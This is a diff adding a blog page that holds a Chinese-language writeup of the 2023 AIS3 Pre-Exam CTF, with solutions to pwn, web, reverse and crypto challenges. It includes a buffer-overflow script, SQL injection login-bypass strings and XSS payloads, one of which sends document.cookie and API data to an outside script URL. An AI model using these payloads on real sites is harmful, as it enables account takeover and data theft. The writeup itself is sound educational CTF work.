@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    2023 AIS3 Pre-Exam writeup 丨
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">2023 AIS3 Pre-Exam writeup</div>
+  <div class="post-meta">
+    <div class="date">2024 二月 7日</div>
+    <div class="tags">
+      
+      <div class="tag-item">writeup</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><pre><code>Are you not a robot ?
+FLAG Format: ^AIS3&#123;[A-Z0-9+-*/!?-]+&#125;$
+
+Author: nella17
+</code></pre>
+<p>點開pdf，flag直接寫在上面了，一開始以為-是_結果浪費一堆時間</p>
+<blockquote>
+<p>AIS3{WELC0ME-T0-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</p>
+</blockquote>
+<h2 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h2><pre><code>Are you a robot?
+
+Note: This is NOT a reversing or pwn challenge. Don&#39;t reverse the 
+binary. It is for local testing only. You will actually get the flag 
+after answering all the questions. You can practice locally by running 
+./robot AIS3&#123;fake_flag&#125; 127.0.0.1 1234 and it will run the service on 
+localhost:1234.
+
+Author: toxicpie
+
+nc chals1.ais3.org 12348
+</code></pre>
+<p>機器人會問你三十題數學，可以直接寫Python用eval()解<br>在discord看到有人說直接用手解，牛皮</p>
+<h3 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h3><pre><code class="highlight python"><span class="keyword">import</span> pwn
+<span class="keyword">import</span> time
+io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">12348</span>)
+
+<span class="built_in">print</span>(io.recvuntil(<span class="string">&quot;!&quot;</span>))
+time.sleep(<span class="number">0.5</span>)
+<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):
+    <span class="built_in">print</span>(<span class="string">f&quot;solving..<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)
+    string=io.recv().decode()
+    string=string.strip(<span class="string">&quot; &quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)
+    <span class="built_in">print</span>(string,<span class="built_in">eval</span>(string))
+    io.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(string)))
+    time.sleep(<span class="number">0.5</span>)
+io.interactive()</code></pre>
+<p><img src="https://hackmd.io/_uploads/rkpBv0QHh.png"></p>
+<blockquote>
+<p>AIS3{don’t_eval_unknown_code_or_pipe_curl_to_sh}<br>被罵了</p>
+</blockquote>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Simply-Pwn"><a href="#Simply-Pwn" class="headerlink" title="Simply Pwn"></a>Simply Pwn</h2><pre><code>The simplest pwn
+
+nc chals1.ais3.org 11111
+</code></pre>
+<p>經典buffer overflow</p>
+<h3 id="先用gdb觀察"><a href="#先用gdb觀察" class="headerlink" title="先用gdb觀察"></a>先用gdb觀察</h3><p>ni到read附近</p>
+<p><img src="https://hackmd.io/_uploads/H1wvwAmHh.png"></p>
+<p>可以發現輸入變數存在<strong>rsi&#x3D;rbp-0x50+0x9&#x3D;rbp-0x47</strong></p>
+<p>所以必須墊<strong>0x47+8byte(RSP)+address</strong>，剛好可以覆蓋return address</p>
+<p><img src="https://hackmd.io/_uploads/ryndPC7S2.png"></p>
+<p>直接讓程式跳到shellcode</p>
+<h3 id="exploit-code-1"><a href="#exploit-code-1" class="headerlink" title="exploit code"></a>exploit code</h3><pre><code class="highlight python"><span class="keyword">import</span> pwn
+io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">11111</span>)
+payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x4f</span>)+pwn.p64(<span class="number">0x4017a5</span>)
+io.sendline(payload)
+io.interactive()</code></pre>
+
+<blockquote>
+<p>AIS3{5imP1e_Pwn_4_beGinn3rs!}</p>
+</blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><pre><code>Login Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入
+admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。
+
+你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的
+攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。
+
+當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明
+你的成功。
+
+Author: Ching367436
+
+http://chals1.ais3.org:8000/
+</code></pre>
+<p>直接讀source code</p>
+<pre><code class="highlight jsx">db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">$&#123;password&#125;</span>&#x27;`</span></code></pre>
+
+<p>聞起來就很有SQL injection的味道</p>
+<h3 id="Bypass-Login-Page"><a href="#Bypass-Login-Page" class="headerlink" title="Bypass Login Page"></a>Bypass Login Page</h3><p>注入<strong>username</strong></p>
+<pre><code class="highlight sql">username<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</code></pre>
+<p>中計直接被Redirect到rickroll</p>
+<p><strong>ok不然改注password</strong></p>
+<pre><code class="highlight sql">username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</code></pre>
+
+<p>成功進入之後還有2fa認證，要輸入2fa code才能進到dashboard看flag，但是仔細看其實驗證完之後他也只是redirect到&#x2F;dashboard而已，所以直接存取&#x2F;dashboard即可</p>
+<blockquote>
+<p>AIS3{‘ UNION SELECT 1, 1, 1, 1 WHERE ({condition})–}</p>
+</blockquote>
+<h2 id="E-Portfolio-baby"><a href="#E-Portfolio-baby" class="headerlink" title="E-Portfolio baby"></a>E-Portfolio baby</h2><pre><code>AIS3 E-Portfolio 是一個學習成就展示平台，讓使用者可以建立並分享他們在 AIS3 的學習成果和專
+案作品。其中，網站提供了一個「Share your portfolio with admin」的功能，讓使用者可以將自
+己的作品集分享給管理員。
+
+你需要找出一個前端漏洞，當你分享作品集給管理員時，能夠竊取 admin 的旗幟。你可以透過探索網站
+的前端程式碼，找到適當的方式來觸發漏洞並取得旗幟。
+
+請注意，你需要在漏洞設計中保持合法並遵循道德原則。請勿以任何方式傷害網站的正常運作或使用者的隱私。
+
+對了，按下「Share your portfolio with admin」的按鈕的時候，admin 會去拜訪的頁面會是
+http://url/share?username=&#123;按下那個按鈕的使用者名稱&#125;。
+
+Author: Ching367436
+
+http://chals1.ais3.org:8880/
+</code></pre>
+<p>看到share to admin就知道這是csrf題目<br>先戳戳看</p>
+<h3 id="測試XSS"><a href="#測試XSS" class="headerlink" title="測試XSS"></a>測試XSS</h3><pre><code class="highlight htmlmixed">&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+<p>沒反應，因為寫上文字是使用innerHTML，所以對 <strong>&lt;script&gt;</strong> 標籤不起作用</p>
+<pre><code class="highlight jsx"><span class="keyword">if</span> (data.<span class="property">success</span>) &#123;
+                        username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span>
+                        about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span>
+                        avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span>
+                    &#125; <span class="keyword">else</span> &#123;
+                        <span class="title function_">alert</span>(data.<span class="property">message</span>)
+                    &#125;</code></pre>
+<p>用 <strong>&lt;img src&gt;</strong> 試試</p>
+<pre><code class="highlight htmlembedded">&lt;img src=&quot;123&quot; onerror=alert()&gt;</code></pre>
+<p><img src="https://hackmd.io/_uploads/rkAxgsVH2.png"><br>果然出現XSS</p>
+<h3 id="嘗試當cookie小偷"><a href="#嘗試當cookie小偷" class="headerlink" title="嘗試當cookie小偷"></a>嘗試當cookie小偷</h3><p><strong>一開始的思路是當cookie小偷，然後用admin登入看flag藏在哪</strong></p>
+<pre><code class="highlight htmlembedded">&lt;img src=&#x27;&#x27; onerror=fetch(&#x27;https://script.google.com/macros/s/\
+                           AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\
+                           pW0B8vTj0lureCaOdOA/exec?\
+                           text=cookie:&#x27;+encodeURI(document.cookie))&gt;</code></pre>
+<p><img src="https://hackmd.io/_uploads/B1syQsNBn.png"><br>因為有設定HTTP only所以偷不到cookie(後來發現偷到也沒用，flag不在admin的頁面裡面)</p>
+<h3 id="嘗試直接偷api內容"><a href="#嘗試直接偷api內容" class="headerlink" title="嘗試直接偷api內容"></a>嘗試直接偷api內容</h3><p>看sauce code會發現其實flag寫在admin的密碼裡面，然後密碼又透過api&#x2F;portfolio傳遞<br><img src="https://hackmd.io/_uploads/ByImUsEB3.png"></p>
+<p>ok開偷</p>
+<pre><code class="highlight htmlmixed">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;api/portfolio&#x27;)
+      .then(response =&gt;response.text()).then(text=&gt;&#123;
+        var url=
+            &#x27;https://script.google.com/macros/s/\
+            AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\
+            pW0B8vTj0lureCaOdOA/exec?text=&#x27;
+        fetch(url+encodeURI(text))
+      &#125;)&quot;&gt;
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/S19GtoVrh.png"><br>在瀏覽器上測試成功，但share to admin甚麼事都沒發生</p>
+<p><img src="https://hackmd.io/_uploads/HkNT5jNrh.png"><br>網站沒有設定CSP，所以應該是機器人沒辦法訪問外網</p>
+<h3 id="嘗試寫入自己的page"><a href="#嘗試寫入自己的page" class="headerlink" title="嘗試寫入自己的page"></a>嘗試寫入自己的page</h3><p>沒辦法直接用webhook就變很複雜了</p>
+<p><strong>改變絲路:</strong><br>偷到api&#x2F;portfolio-&gt;登入自己的帳號-&gt;寫入textarea-&gt;儲存</p>
+<p><em><strong>創建登入form</strong></em></p>
+<pre><code class="highlight htmlmixed">&lt;form id=form action=&quot;/api/login&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;
+    &lt;input name=&quot;username&quot; value=&quot;test123&quot;&gt;
+    &lt;input name=&quot;password&quot; value=&quot;test&quot;&gt;
+&lt;/form&gt;</code></pre>
+<p><em><strong>先偷api&#x2F;portfolio再submit表單切成自己帳號，最後改textarea、click save</strong></em></p>
+<pre><code class="highlight htmlmixed">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;http://web:8000/api/portfolio&#x27;)
+      .then(response =&gt;response.text()).then(text=&gt;&#123;
+        form.submit()
+        setTimeout(function() &#123;
+        console.log(&#x27;123&#x27;);
+        &#125;, 1000);    
+        var win=window.open(&#x27;http://web:8000/portfolio&#x27;)
+        setTimeout(() =&gt; &#123;
+        win.document.querySelector(&#x27;textarea[id=about]&#x27;).value = text;
+        win.document.querySelector(&#x27;button[id=save]&#x27;).click()
+    &#125;, 1000)
+      &#125;)&quot;&gt;</code></pre>
+<p><img src="https://hackmd.io/_uploads/HJDHTiNSn.png"></p>
+<blockquote>
+<p>AIS3{&lt;img src&#x3D;x onerror&#x3D;’fetch(…}</p>
+</blockquote>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Simply-Reverse"><a href="#Simply-Reverse" class="headerlink" title="Simply Reverse"></a>Simply Reverse</h2><pre><code>Just reverse it!
+</code></pre>
+<h3 id="先執行看看"><a href="#先執行看看" class="headerlink" title="先執行看看"></a>先執行看看</h3><p><img src="https://hackmd.io/_uploads/B10RnhEr2.png"></p>
+<p><img src="https://hackmd.io/_uploads/S1kMT2NSh.png"></p>
+<h3 id="丟ghidra"><a href="#丟ghidra" class="headerlink" title="丟ghidra"></a>丟ghidra</h3><p><img src="https://hackmd.io/_uploads/ryusahEB3.png"><br>這邊有一個verify函式判斷key是否正確</p>
+<h3 id="解題絲路"><a href="#解題絲路" class="headerlink" title="解題絲路"></a>解題絲路</h3><pre><code>因為verify()的迴圈每跑一圈就會檢查一個char，一直到local_c=0x22 然後return true;
+所以可以brute force 跑每個字元然後看迴圈有沒有炸掉
+</code></pre>
+<h3 id="exploit-code-2"><a href="#exploit-code-2" class="headerlink" title="exploit code"></a>exploit code</h3><pre><code class="highlight python"><span class="keyword">import</span> pwn
+<span class="keyword">import</span> time
+io=pwn.process(<span class="string">&quot;gdb&quot;</span>)
+io.sendline(<span class="string">&quot;file rev&quot;</span>)
+io.sendline(<span class="string">&quot;start&quot;</span>)
+io.sendline(<span class="string">&quot;b *0x5555555551fb&quot;</span>)    <span class="comment">#把breakpoint 設在迴圈裏面，如果沒有停代表是錯的</span>
+io.recvrepeat(timeout=<span class="number">1</span>)
+flag=<span class="string">&quot;AIS3&#123;&quot;</span>
+<span class="keyword">while</span> <span class="number">1</span>:
+    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7E</span>):
+        <span class="built_in">print</span>(<span class="string">&quot;trying..&quot;</span>,flag+<span class="built_in">chr</span>(i))
+        io.sendline(<span class="string">f&quot;set args <span class="subst">&#123;flag+<span class="built_in">chr</span>(i)&#125;</span>&quot;</span>)
+        io.sendline(<span class="string">&quot;run&quot;</span>)
+        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>):
+            io.sendline(<span class="string">&quot;c&quot;</span>)
+        io.recvrepeat(timeout=<span class="number">0.3</span>).decode()
+        io.sendline(<span class="string">&quot;x/x $rbp-0x4&quot;</span>)
+        string=io.recv().decode()
+        <span class="keyword">if</span> <span class="string">&quot;No&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> string:
+            flag+=<span class="built_in">chr</span>(i)
+            <span class="keyword">break</span></code></pre>
+<blockquote>
+<p>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</p>
+</blockquote>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Fernet"><a href="#Fernet" class="headerlink" title="Fernet"></a>Fernet</h2><pre><code>你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。
+你需要解開被加密的檔案，否則事情就大條了！
+
+flag format : FLAG&#123;xxx&#125;
+
+Auther : Richard ( dogxxx)
+</code></pre>
+<h3 id="看code"><a href="#看code" class="headerlink" title="看code"></a>看code</h3><pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+<span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet
+<span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256
+<span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2
+<span class="keyword">from</span> secret <span class="keyword">import</span> FLAG
+
+<span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, password</span>):
+    salt = os.urandom(<span class="number">16</span>)  
+    key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  
+    f = Fernet(base64.urlsafe_b64encode(key))  
+    ciphertext = f.encrypt(plaintext.encode())  
+    <span class="keyword">return</span> base64.b64encode(salt + ciphertext).decode()
+
+<span class="comment"># Usage:</span>
+leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span>
+plaintext = FLAG
+
+<span class="comment"># Encrypt</span>
+ciphertext = encrypt(plaintext, leak_password)
+<span class="built_in">print</span>(<span class="string">&quot;Encrypted data:&quot;</span>,ciphertext)</code></pre>
+<h3 id="絲路"><a href="#絲路" class="headerlink" title="絲路"></a>絲路</h3><pre><code>密碼都給你了所以反著解密就好了
+</code></pre>
+<p>加密流程是:產生salt-&gt;產生key-&gt;用key加密flag-&gt;把salt+ciphertext用base64 encode起來<br>所以其實salt也給你了就是base64 decode後的前16個char</p>
+<h3 id="decrypt-code"><a href="#decrypt-code" class="headerlink" title="decrypt code"></a>decrypt code</h3><p>解密流程:base64 decode-&gt;取得salt、ciphertext-&gt;用password、salt重建key-&gt;用key解密ciphertext</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+<span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet
+<span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256
+<span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2
+cipher=<span class="string">&#x27;&#x27;&#x27;</span>
+<span class="string">iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlO</span>
+<span class="string">aC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1Ja</span>
+<span class="string">OGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj</span>
+<span class="string">&#x27;&#x27;&#x27;</span>
+cipher=cipher.encode()
+cipher=base64.b64decode(cipher)
+salt=cipher[:<span class="number">16</span>]
+cipher=cipher[<span class="number">16</span>:]
+<span class="built_in">print</span>(salt)
+<span class="built_in">print</span>(cipher)
+leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span>
+key = PBKDF2(leak_password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  
+f = Fernet(base64.urlsafe_b64encode(key))  
+plaintext=f.decrypt(cipher)
+<span class="built_in">print</span>(plaintext)</code></pre>
+<blockquote>
+<p>FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!<em>!!!</em>!}</p>
+</blockquote>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
